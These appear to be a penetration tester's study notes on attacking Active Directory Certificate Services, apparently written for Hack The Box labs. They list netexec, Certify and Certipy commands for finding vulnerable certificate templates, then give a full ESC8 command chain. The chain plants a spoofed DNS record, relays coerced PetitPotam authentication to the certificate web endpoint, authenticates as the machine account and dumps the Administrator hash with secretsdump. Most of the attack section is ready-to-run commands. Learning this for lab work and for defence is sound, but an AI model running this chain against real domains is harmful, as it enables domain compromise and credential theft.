See https://academy.hackthebox.com/module/details/236 ADCS Module (still need to do...)

See https://0xdf.gitlab.io/2023/06/17/htb-escape.html#smb---tcp-445 for an example

One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using `netexec`

Initial Check
```bash
nxc ldap <victim_ip> -u 'user' -p 'password' -M adcs
```

## Identify Vulnerable Template

#### Certify.exe
We can use `Certify.exe` to identify vulnerable services. The README has a walkthrough to enumerate and abuse certificate services

Usage
```powershell
.\Certify.exe find /vulnerable /currentuser
	# /currentuser checks for groups of the current user
```
Based on the results, the README will guide on the actions to take

#### Certipy
`Certipy` is an alternative tool and can be run remotely

Usage
```bash
[export KRB5CCNAME=TGT.ccache] # If we want to do this via Kerberos, we need to generate or have a TGT first (nxc --generate-tgt OR get-TGT.py)... ignore otherwise
certipy find -u 'DOMAIN\user' -p 'pass' [-hashes <NTLM>] [-k] -target <target> -text -stdout -vulnerable

# Look Here
[!] Vulnerabilities
```

## ESC8
If present, you can get the machine to auth back to attacker, relay auth to ADCS and get a certificate as the machine account

Attack
```bash
# Check MachineAccountQuota to see if we can add a machine
nxc ldap <domain> -u <user> -p <pass> -k -M maq 

# Setup env
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
export KRB5CCNAME=<user.ccache>

# Add a record structured <host><empty CREDENTIAL_TARGET_INFOMATION structure>
KRB5CCNAME=<user.ccache> bloodyAD -u user -p pass -d domain -k --host <FQDN> --dc-ip <ip> add dnsRecord <HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <attacker_ip>

# Start certipy relay targeting ADCS webserver
KRB5CCNAME=<user.ccache> certipy relay -target 'http://<FQDN>/' -template DomainController

# Check Coerce methods
KRB5CCNAME=<user.ccache> netexec smb <FQDN> -u user -p pass -k -M coerce_plus 

# Use a Coerce method... PetitPotam is great
KRB5CCNAME=<user.ccache> netexec smb <FQDN> -u user -p pass -k -M coerce_plus -o LISTENER=<full record> METHOD=PetitPotam

# Check relay. It should create a .pfx file

# Authenticate as computer account & capture TGT and NTLM of Machine account
certipy auth -pfx <victim.pfx> -dc-ip <DC_ip>

# Dump Administrator hashes
export KRB5CCNAME=<DC.ccache>
KRB5CCNAME=<DC.ccache> secretsdump.py -k -no-pass '<domain>'/'<hostname>$'@'<FQDN>' -just-dc-user Administrator
```